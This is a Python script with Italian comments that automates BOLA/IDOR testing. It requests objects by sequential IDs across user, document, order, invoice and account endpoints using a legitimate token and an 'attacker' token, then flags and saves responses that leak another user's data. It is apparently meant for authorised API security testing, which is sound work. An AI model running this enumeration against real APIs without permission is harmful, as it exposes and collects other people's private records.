#!/usr/bin/env python3
"""
apinator — BOLA/IDOR Automated Tester
======================================
Testa Broken Object Level Authorization confrontando le risposte
di due utenti diversi sugli stessi endpoint/ID.

Usage:
    python3 bola_tester.py

Config:
    Modifica le variabili nella sezione CONFIG prima di eseguire.
"""

import requests
import json
import time
from typing import Generator

# ── CONFIG ──────────────────────────────────────────────────────────────────

BASE_URL     = "https://target.com/api/v1"
USER_A_TOKEN = "eyJhbGciOiJIUzI1NiJ9..."   # token utente legittimo (proprietario)
USER_B_TOKEN = "eyJhbGciOiJIUzI1NiJ9..."   # token attaccante
DELAY        = 0.2                          # secondi tra richieste (evita rate limit)
TIMEOUT      = 10

# Endpoint da testare — {id} verrà sostituito con ogni ID della lista
ENDPOINTS = [
    "/users/{id}/profile",
    "/users/{id}/documents",
    "/orders/{id}",
    "/invoices/{id}",
    "/accounts/{id}",
]

# ── ID GENERATORS ────────────────────────────────────────────────────────────

def integer_ids(start: int = 1, end: int = 200) -> Generator:
    """Genera ID interi sequenziali."""
    for i in range(start, end + 1):
        yield str(i)

def id_list(ids: list) -> Generator:
    """Usa una lista predefinita di ID (es. raccolti durante il test)."""
    for i in ids:
        yield str(i)

# ── CORE ─────────────────────────────────────────────────────────────────────

def make_request(url: str, token: str) -> requests.Response | None:
    try:
        return requests.get(
            url,
            headers={"Authorization": f"Bearer {token}"},
            timeout=TIMEOUT
        )
    except requests.RequestException as e:
        print(f"  [ERR] {url} → {e}")
        return None


def test_bola(endpoint_template: str, ids: Generator) -> list[dict]:
    findings = []

    for obj_id in ids:
        url = BASE_URL + endpoint_template.replace("{id}", obj_id)

        r_a = make_request(url, USER_A_TOKEN)
        r_b = make_request(url, USER_B_TOKEN)
        time.sleep(DELAY)

        if r_a is None or r_b is None:
            continue

        # Casi interessanti
        if r_b.status_code == 200:
            if r_a.status_code == 200 and r_b.text == r_a.text:
                status = "🔴 BOLA CONFIRMED"
                detail = "UserB accede e riceve gli stessi dati di UserA"
            elif r_a.status_code != 200:
                status = "🟠 SUSPECT — UserB ottiene 200, UserA no"
                detail = f"UserA={r_a.status_code}, UserB=200"
            else:
                status = "🟡 CHECK — entrambi 200 ma response diversa"
                detail = "Verifica manuale consigliata"

            finding = {
                "url": url,
                "object_id": obj_id,
                "status": status,
                "detail": detail,
                "user_a_status": r_a.status_code,
                "user_b_status": r_b.status_code,
                "response_b_preview": r_b.text[:200],
            }
            findings.append(finding)
            print(f"  {status} → {url}")

    return findings


def run():
    print("=" * 60)
    print("  apinator — BOLA/IDOR Tester")
    print("=" * 60)
    print(f"  Target  : {BASE_URL}")
    print(f"  Endpoints: {len(ENDPOINTS)}")
    print()

    all_findings = []

    for endpoint in ENDPOINTS:
        print(f"[*] Testing: {endpoint}")
        findings = test_bola(endpoint, integer_ids(1, 500))
        all_findings.extend(findings)
        print()

    # ── Report ────────────────────────────────────────────────────
    print("=" * 60)
    print(f"  RESULTS: {len(all_findings)} finding(s)")
    print("=" * 60)

    if all_findings:
        output_file = "bola_findings.json"
        with open(output_file, "w") as f:
            json.dump(all_findings, f, indent=2)
        print(f"\n  Output salvato in: {output_file}")
        for f in all_findings:
            print(f"\n  {f['status']}")
            print(f"  URL     : {f['url']}")
            print(f"  Detail  : {f['detail']}")
            print(f"  Preview : {f['response_b_preview'][:100]}...")
    else:
        print("\n  Nessun finding BOLA rilevato.")

    print()


if __name__ == "__main__":
    run()
